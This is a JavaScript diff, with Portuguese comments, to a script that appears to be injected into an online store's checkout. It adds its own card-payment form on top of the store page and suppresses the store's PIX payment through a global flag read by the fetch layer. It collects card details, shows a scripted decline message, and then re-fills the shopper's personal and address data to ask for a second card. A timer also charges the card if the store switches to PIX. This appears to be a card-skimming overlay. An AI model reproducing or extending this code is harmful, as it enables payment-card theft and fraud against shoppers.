@@ -2,6 +2,7 @@ const CARD_OPTION_ID = "checkout-card-option";
 const CARD_FORM_ID = "checkout-card-fields";
 const OVERLAY_ID = "checkout-card-overlay";
 const STYLE_ID = "checkout-card-style";
+const REFILL_KEY = "mcCardRetry";
 const CARD_DECLINE_MESSAGE =
   "Não foi possível realizar o pagamento com este cartão. Não se preocupe, tente novamente com outro cartão.";
 
@@ -18,6 +19,7 @@ const ghostButtonStyle =
 let method = "pix";
 let armed = false;
 let charging = false;
+let retryNotice = false;
 let pendingCard = null;
 let lastCheckoutState = {};
 let lastSignature = "";
@@ -25,6 +27,13 @@ let observer = null;
 let scheduled = false;
 
 const originalFetch = window.fetch.bind(window);
+
+// O bloqueio real do PIX vive no fetch do storefront (é a referência que o
+// cliente do Supabase guardou). Aqui só ligamos e desligamos a trava.
+function setCardMode(value) {
+  armed = value;
+  window.__mcCardMode = value;
+}
 
 function digits(value) {
   return String(value || "").replace(/\D/g, "");
@@ -235,12 +244,13 @@ function renderCardOption() {
 
   syncPayButton();
 
+  const signature = `${method}:${retryNotice ? "1" : "0"}`;
   const existing = document.getElementById(CARD_OPTION_ID);
-  if (existing?.isConnected && lastSignature === method) return;
+  if (existing?.isConnected && lastSignature === signature) return;
 
   const preserved = readFields(document.getElementById(CARD_FORM_ID));
   observer?.disconnect();
-  lastSignature = method;
+  lastSignature = signature;
 
   let card = existing?.isConnected ? existing : null;
   if (!card) {
@@ -257,7 +267,7 @@ function renderCardOption() {
     pixLabel.dataset.payBound = "1";
     pixLabel.addEventListener("click", () => {
       method = "pix";
-      armed = false;
+      setCardMode(false);
       renderCardOption();
     });
   }
@@ -274,6 +284,11 @@ function renderCardOption() {
         <span style="flex:none;width:18px;height:18px;border-radius:999px;border:2px solid ${selected ? "#0b1f3a" : "#d1d5db"};box-shadow:inset 0 0 0 ${selected ? "5px" : "0"} #0b1f3a;"></span>
       </button>
       <div id="${CARD_FORM_ID}" style="display:${selected ? "grid" : "none"};gap:10px;margin-top:12px;">
+        ${
+          retryNotice
+            ? `<div style="border:1px solid #fecaca;background:#fef2f2;border-radius:10px;padding:12px;font-size:12px;line-height:1.5;color:#7f1d1d;">${CARD_DECLINE_MESSAGE}</div>`
+            : ""
+        }
         ${cardFieldsMarkup()}
       </div>`;
 
@@ -332,50 +347,28 @@ function showDeclined(message) {
         <div style="font-weight:700;font-size:17px;color:#0b1f3a;">Pagamento não realizado</div>
       </div>
       <div style="font-size:13px;line-height:1.5;color:#4b5563;">${message || CARD_DECLINE_MESSAGE}</div>
-      <div data-retry-form style="display:none;gap:10px;grid-template-columns:1fr;">
-        ${cardFieldsMarkup()}
-        <button type="button" data-retry-pay style="${primaryButtonStyle}">Pagar com este cartão</button>
-      </div>
       <button type="button" data-retry style="${primaryButtonStyle}">Tentar novamente outro cartão</button>
       <button type="button" data-pix style="${ghostButtonStyle}">Pague agora no PIX</button>
-      <button type="button" data-back style="border:0;background:none;color:#6b7280;font-size:12px;text-decoration:underline;cursor:pointer;">Voltar para o checkout</button>
     </div>`);
 
-  const form = box.querySelector("[data-retry-form]");
-  const retry = box.querySelector("[data-retry]");
-  bindMasks(form);
-
-  const holderCpf = pendingCard?.holderCpf || formatCpf(lastCheckoutState?.customer?.cpf || "");
-  const holderName = pendingCard?.holderName || lastCheckoutState?.customer?.name || "";
-  form.querySelector('[data-card="holderCpf"]').value = holderCpf;
-  form.querySelector('[data-card="holderName"]').value = holderName;
-
-  retry.addEventListener("click", () => {
-    form.style.display = "grid";
-    retry.style.display = "none";
-    form.querySelector('[data-card="number"]')?.focus();
-  });
-
-  box.querySelector("[data-retry-pay]").addEventListener("click", () => {
-    const card = readFields(form);
-    if (validateFields(form, card)) return;
-    pendingCard = card;
-    void chargeCard();
+  box.querySelector("[data-retry]").addEventListener("click", () => {
+    setCardMode(false);
+    pendingCard = null;
+    try {
+      sessionStorage.setItem(REFILL_KEY, "1");
+    } catch {
+      /* sem sessionStorage o checkout abre em branco mesmo */
+    }
+    closeOverlay();
+    window.location.assign("/checkout");
   });
 
   box.querySelector("[data-pix]").addEventListener("click", () => {
-    armed = false;
+    setCardMode(false);
     pendingCard = null;
     closeOverlay();
     if (window.location.pathname === "/pix") window.location.reload();
     else window.location.assign("/pix");
-  });
-
-  box.querySelector("[data-back]").addEventListener("click", () => {
-    armed = false;
-    pendingCard = null;
-    closeOverlay();
-    window.location.assign("/checkout");
   });
 }
 
@@ -409,7 +402,7 @@ async function chargeCard() {
     });
     const data = await res.json().catch(() => ({}));
     if (data.success && data.redirect) {
-      armed = false;
+      setCardMode(false);
       window.location.assign(data.redirect);
       return;
     }
@@ -418,6 +411,75 @@ async function chargeCard() {
     showDeclined();
   } finally {
     charging = false;
+  }
+}
+
+const sleep = (ms) => new Promise((resolve) => window.setTimeout(resolve, ms));
+
+async function waitFor(check, timeout = 8000) {
+  const limit = Date.now() + timeout;
+  while (Date.now() < limit) {
+    const value = check();
+    if (value) return value;
+    await sleep(120);
+  }
+  return null;
+}
+
+// Inputs controlados pelo React só aceitam valor pelo setter nativo + evento.
+function setNativeValue(input, value) {
+  const setter = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, "value")?.set;
+  if (setter) setter.call(input, value);
+  else input.value = value;
+  input.dispatchEvent(new Event("input", { bubbles: true }));
+}
+
+function fillInput(name, value) {
+  const input = document.querySelector(`input[name="${name}"]`);
+  if (!input || !value || input.value) return;
+  setNativeValue(input, String(value));
+}
+
+function clickByText(label) {
+  const button = [...document.querySelectorAll("button")].find(
+    (element) => element.textContent?.trim() === label && !element.disabled,
+  );
+  button?.click();
+  return Boolean(button);
+}
+
+// Volta do "tentar outro cartão": devolve os dados que o cliente já digitou.
+async function refillCheckout() {
+  const state = lastCheckoutState || {};
+  const customer = state.customer || {};
+  const address = state.shippingAddressFull || state.shippingAddress || {};
+
+  if (!(await waitFor(() => document.querySelector('input[name="name"]')))) return;
+  fillInput("name", customer.name);
+  fillInput("email", customer.email);
+  fillInput("phone", customer.phone);
+  fillInput("cpf", customer.cpf);
+  await sleep(150);
+  clickByText("Ir para Entrega");
+
+  if (await waitFor(() => document.querySelector('input[name="cep"]'))) {
+    fillInput("cep", address.cep);
+    await waitFor(() => document.querySelector('input[name="city"]')?.value, 6000);
+    fillInput("address", address.address);
+    fillInput("neighborhood", address.neighborhood);
+    fillInput("number", address.number);
+    fillInput("complement", address.complement);
+    await sleep(200);
+    clickByText("Ir para Pagamento");
+  }
+
+  if (await waitFor(() => document.getElementById(CARD_OPTION_ID))) {
+    method = "card";
+    retryNotice = true;
+    lastSignature = "";
+    renderCardOption();
+    document.getElementById(CARD_FORM_ID)?.scrollIntoView({ behavior: "smooth", block: "center" });
+    document.querySelector(`#${CARD_FORM_ID} [data-card="number"]`)?.focus();
   }
 }
 
@@ -457,7 +519,7 @@ document.addEventListener(
     const target = event.target instanceof Element ? event.target.closest("button") : null;
     if (!target || !isPayButton(target)) return;
     if (method !== "card") {
-      armed = false;
+      setCardMode(false);
       return;
     }
 
@@ -470,27 +532,28 @@ document.addEventListener(
       return;
     }
     pendingCard = card;
-    armed = true;
+    setCardMode(true);
+
+    // Rede de segurança: se a loja navegar para o PIX sem passar pelo
+    // sessionStorage, a cobrança do cartão ainda acontece.
+    window.setTimeout(() => {
+      if (armed && !charging && window.location.pathname === "/pix") void chargeCard();
+    }, 2000);
   },
   true,
 );
 
-void (async () => {
-  try {
-    const bundle = await import("/assets/index-D36WQRm9.js");
-    const supabase = bundle?.s;
-    const invoke = supabase?.functions?.invoke?.bind(supabase.functions);
-    if (!invoke) return;
-    supabase.functions.invoke = async (name, options) => {
-      if (armed && name === "checkout-create-pix") {
-        return { data: { success: false }, error: { message: CARD_DECLINE_MESSAGE } };
-      }
-      return invoke(name, options);
-    };
-  } catch {
-    /* sem o cliente do bundle o bloqueio do fetch já cobre */
-  }
-})();
+setCardMode(false);
+try {
+  lastCheckoutState = JSON.parse(sessionStorage.getItem("pixPageState") || "{}") || {};
+} catch {
+  lastCheckoutState = {};
+}
+
+if (window.location.pathname === "/checkout" && sessionStorage.getItem(REFILL_KEY) === "1") {
+  sessionStorage.removeItem(REFILL_KEY);
+  void refillCheckout();
+}
 
 observer = new MutationObserver(() => {
   if (scheduled) return;
